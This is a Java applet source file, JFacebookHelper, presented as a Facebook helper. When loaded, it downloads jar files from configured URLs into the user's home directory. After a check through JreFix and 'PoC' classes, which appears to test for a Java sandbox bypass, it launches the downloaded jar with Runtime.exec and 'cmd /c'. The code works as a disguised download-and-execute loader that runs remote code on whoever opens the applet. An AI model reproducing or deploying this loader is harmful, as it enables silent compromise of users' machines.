package de.demonbindestrichcraft.facebookhelper;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.security.Policy;
import javax.swing.*;

public class JFacebookHelper extends JApplet {

    public JFacebookHelper() {
    }

    public boolean allok() {
        JreFix jreFix = new JreFix();
        if (jreFix.isFixxed()) {
            System.out.println("cool");
            return false;
        } else if (jreFix.isAlreadyFixxed()) {
            System.out.println("super cool");
            int i = PoC.i();
            if (i == -1) {
                System.out.println("Can not fix buggs really!");
                return false;
            } else if (i == 0) {
                System.out.println("Can not fix buggs!");
                return false;
            } else {
                return true;
            }
        } else {
            System.out.println("uncool");
            return false;
        }
    }

    @Override
    public void init() {
        //System.setSecurityManager(new SecurityManager());
        //Policy.setPolicy(new MinimalPolicy());
        File userHome = new File(System.getProperty("user.home") + File.separator + "FacebookHelper");
        File file2 = new File(userHome.getAbsolutePath() + File.separator + "lib");
        file2.mkdirs();
        File pageOutput = new File(userHome.getAbsolutePath() + File.separator + "FacebookHelper.jar");
        File pageOutput2 = new File(file2.getAbsolutePath() + File.separator + "selenium-2.45.jar");
        File pageOutput3 = new File(file2.getAbsolutePath() + File.separator + "junit-3.8.1.jar");
        String facebookhelperlink = MyResource.loadStringOutResoutce("fblink.cfg", new File("fblink.cfg"), "facebookhelperlink");
        String seleniumlink = MyResource.loadStringOutResoutce("fblink.cfg", new File("fblink.cfg"), "seleniumlink");
        String junitlink = MyResource.loadStringOutResoutce("fblink.cfg", new File("fblink.cfg"), "junitlink");
        //System.out.println(pageOutput.getAbsolutePath());
        try {
            if (!pageOutput.exists()) {
                //pageOutput.createNewFile();
                saveUrl(pageOutput.getAbsolutePath(), facebookhelperlink);
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }

        try {
            if (!pageOutput3.exists()) {
                //pageOutput3.createNewFile();
                saveUrl(pageOutput3.getAbsolutePath(), junitlink);
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }

        try {
            if (!pageOutput2.exists()) {
                //pageOutput2.createNewFile();
                saveUrl(pageOutput2.getAbsolutePath(), seleniumlink);
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    @Override
    public void start() {
        if (!allok()) {
            return;
        }
        File userHome = new File(System.getProperty("user.home") + File.separator + "FacebookHelper");
        File fbHelper = new File(userHome.getAbsolutePath() + File.separator + "FacebookHelper.jar");
        int indexOf = System.getProperty("os.name").toLowerCase().indexOf("win");
        String property = System.getProperty("java.home");
        //System.out.println(property);
        if (!property.endsWith("java")) {
            if (property.lastIndexOf("jre") < 0) {
                property = property + File.separator + "java";
            } else {
                property = property + File.separator + "bin" + File.separator + "java";
            }
        }
        if (indexOf >= 0) {
            try {
                //System.out.println(property);
                Process exec = Runtime.getRuntime().exec("cmd /c @\"" + property + "\" -jar \"" + fbHelper.getAbsolutePath() + "\"");
                exec.waitFor();
            } catch (Exception ex) {
                Logger.getLogger(JFacebookHelper.class.getName()).log(Level.SEVERE, null, ex);
            }
        } else {
            try {
                Process exec = Runtime.getRuntime().exec(property + " -jar " + fbHelper.getAbsolutePath());
                exec.waitFor();
            } catch (Exception ex) {
                Logger.getLogger(JFacebookHelper.class.getName()).log(Level.SEVERE, null, ex);
            }
        }
    }

    public void saveUrl(final String filename, final String urlString) {
        InputStream in = null;
        FileOutputStream fout = null;
        int contentLength = 0;
        long downloaded = 0;
        int downloadedTarget = 0;
        int buffer = 500;
        URL uRL = null;
        HttpURLConnection openConnection = null;
        try {
            uRL = new URL(urlString);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        try {
            openConnection = (HttpURLConnection) uRL.openConnection();
            /*if (downloaded + buffer < contentLength) {
            downloadedTarget = downloaded + buffer;
            } else {
            downloadedTarget = contentLength;
            }*/
            openConnection.setRequestProperty("connection", "close");
            System.setProperty("http.keepAlive", "false");
            // openConnection.setRequestProperty("Range", "bytes=" + downloaded + "-" + downloadedTarget);
            openConnection.setReadTimeout(999999999);
            openConnection.setRequestMethod("GET");
            openConnection.setChunkedStreamingMode(500);
            openConnection.setConnectTimeout(999999999);
            openConnection.setDoInput(true);
            openConnection.setDoOutput(true);
            int responseCode = openConnection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                contentLength = openConnection.getContentLength();
            } else {
                contentLength = -1;
            }
            if (contentLength == -1) {
                if (in != null) {
                    try {
                        in.close();
                    } catch (IOException ex) {
                        Logger.getLogger(JFacebookHelper.class.getName()).log(Level.SEVERE, null, ex);
                    }
                }
                if (fout != null) {
                    try {
                        fout.close();
                    } catch (IOException ex) {
                        Logger.getLogger(JFacebookHelper.class.getName()).log(Level.SEVERE, null, ex);
                    }
                }
                return;
            }
            in = openConnection.getInputStream();
            fout = new FileOutputStream(filename);


            final byte data[] = new byte[buffer];
            int count;
            do {
                while ((count = in.read(data, 0, buffer)) != -1) {
                    fout.write(data, 0, count);
                    fout.flush();
                }
                downloaded += buffer;
            } while (downloaded < contentLength);
        } catch (Exception ex) {
            ex.printStackTrace();
        } finally {
            if (in != null) {
                try {
                    in.close();
                } catch (IOException ex) {
                    Logger.getLogger(JFacebookHelper.class.getName()).log(Level.SEVERE, null, ex);
                }
            }
            if (fout != null) {
                try {
                    fout.close();
                } catch (IOException ex) {
                    Logger.getLogger(JFacebookHelper.class.getName()).log(Level.SEVERE, null, ex);
                }
            }
        }
    }

    public static void main(String[] args) {
        JFacebookHelper jFacebookHelper = new JFacebookHelper();
        jFacebookHelper.init();
        jFacebookHelper.start();
    }
}